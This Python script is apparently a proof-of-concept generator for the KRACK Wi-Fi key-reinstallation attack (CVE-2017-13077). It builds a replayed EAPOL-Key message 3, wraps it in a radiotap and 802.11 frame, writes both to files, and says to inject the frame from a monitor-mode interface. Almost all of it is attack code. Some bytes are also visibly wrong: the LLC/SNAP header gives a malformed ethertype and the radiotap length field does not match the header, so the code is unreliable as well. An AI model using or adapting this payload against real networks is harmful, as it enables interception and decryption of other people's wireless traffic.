#!/usr/bin/env python3
"""CVE-2017-13077 — KRACK. 802.11 4-way handshake key reinstallation.
Carrier: EAPOL-Key msg#3 with a retransmitted (replayed) replay counter.
Inject via a monitor-mode interface with a raw radiotap+802.11 frame."""
import struct, sys
from pathlib import Path

def build() -> bytes:
    e = bytearray()
    e += b"\x02\x03"                        # EAPOL version 2, type Key
    e += struct.pack(">H", 0x0075)          # length
    e += b"\x02"                            # descriptor: RSN
    e += struct.pack(">H", 0x13C9)          # key info (msg3, install, secure)
    e += struct.pack(">H", 16)              # key length
    e += struct.pack(">Q", 3)               # replay counter (replayed)
    e += b"\x11" * 32                       # nonce
    e += b"\x22" * 16                       # IV
    e += b"\x33" * 8                        # RSC
    e += b"\x44" * 8                        # key ID
    e += b"\x55" * 16                       # MIC
    e += struct.pack(">H", 0)               # key data length
    return bytes(e)

def radiotap_wrap(eapol: bytes) -> bytes:
    """Minimal radiotap + 802.11 data frame carrying the EAPOL payload."""
    rt = bytes.fromhex("00000a000000000000000000")           # radiotap header (no fields)
    fc = bytes.fromhex("0801")                                # data frame, to-DS
    dur = b"\x00\x00"
    a1 = bytes.fromhex("ffffffffffff")                        # broadcast
    a2 = bytes.fromhex("001122334455")                        # source (set yours)
    a3 = bytes.fromhex("66778899aabb")                        # bssid (set yours)
    seq = b"\x10\x00"
    llc = bytes.fromhex("aaaa030000000888e5")                 # LLC/SNAP -> EAPOL
    return rt + fc + dur + a1 + a2 + a3 + seq + llc + eapol

def main():
    out = Path(sys.argv[1] if len(sys.argv) > 1 else "cve-2017-13077.bin")
    data = build(); out.write_bytes(data)
    (out.with_suffix(".frame")).write_bytes(radiotap_wrap(data))
    print(f"[+] CVE-2017-13077 EAPOL payload -> {out} ({len(data)} bytes)")
    print(f"[+] radiotap-wrapped frame -> {out.with_suffix('.frame')}")

if __name__ == "__main__":
    main()
